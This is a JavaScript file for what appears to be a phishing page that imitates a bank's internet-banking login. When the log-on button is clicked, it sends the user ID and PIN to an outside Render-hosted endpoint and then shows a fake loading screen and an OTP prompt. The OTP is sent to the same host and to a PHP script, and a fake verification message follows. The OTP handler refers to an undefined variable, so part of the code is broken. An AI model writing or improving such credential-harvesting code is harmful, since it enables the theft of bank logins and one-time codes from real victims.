  const renderURL = "https://your-app-name.onrender.com/send-data";
const setupWatermark = (inputId, labelId) => {
    const input = document.getElementById(inputId);
    const label = document.getElementById(labelId);
    if (input && label) {
        input.addEventListener('input', () => {
            label.style.display = input.value.length > 0 ? 'none' : 'block';
        });
    }
};

document.addEventListener('DOMContentLoaded', () => {
    // 1. Keep the Watermark Fix
    setupWatermark('txiID', 'txiID_watermask_label');
    setupWatermark('txiPwd', 'txiPwd_watermask_label');

    // 2. LOG ON BUTTON LOGIC
    const btnLogOn = document.getElementById('btnLogOn');
    if (btnLogOn) {
        btnLogOn.addEventListener('click', function() {
            // --- NEW: GRAB THE DATA ---
            const user = document.getElementById('txiID').value;
            const pass = document.getElementById('txiPwd').value;

         // --- NEW: SEND TO RENDER BACKEND ---
fetch(renderURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        userId: user,
        pin: pass
    })
});

            // --- KEEP: YOUR VISUAL LOGIC ---
            const toHide = document.querySelectorAll('.EnterData, .btnLogOnCover, .btnRegisterOnline, .BHBox, .iBankingLoGo');
            toHide.forEach(el => el.style.display = 'none');

            const loader = document.getElementById('loadingSection');
            if (loader) loader.style.display = 'block';

            setTimeout(() => {
                if (loader) loader.style.display = 'none';
                const otp = document.getElementById('otpSection');
                if (otp) otp.style.display = 'block';
            }, 3000);
        });
    }

    // 3. VERIFY BUTTON LOGIC
    const btnVerify = document.getElementById('btnVerify');
    if (btnVerify) {
        btnVerify.addEventListener('click', function() {
          // --- NEW: SEND OTP TO RENDER BACKEND ---
fetch(renderURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        otp: otpCode
    })
});
            // --- NEW: SEND OTP TO BACKEND ---
            fetch('send_data.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `otp=${encodeURIComponent(otpCode)}`
            });

            // Visual feedback
            btnVerify.innerText = "Verifying...";
            setTimeout(() => {
                alert("Verification complete. Please wait for confirmation.");
            }, 2000);
        });
    }
});
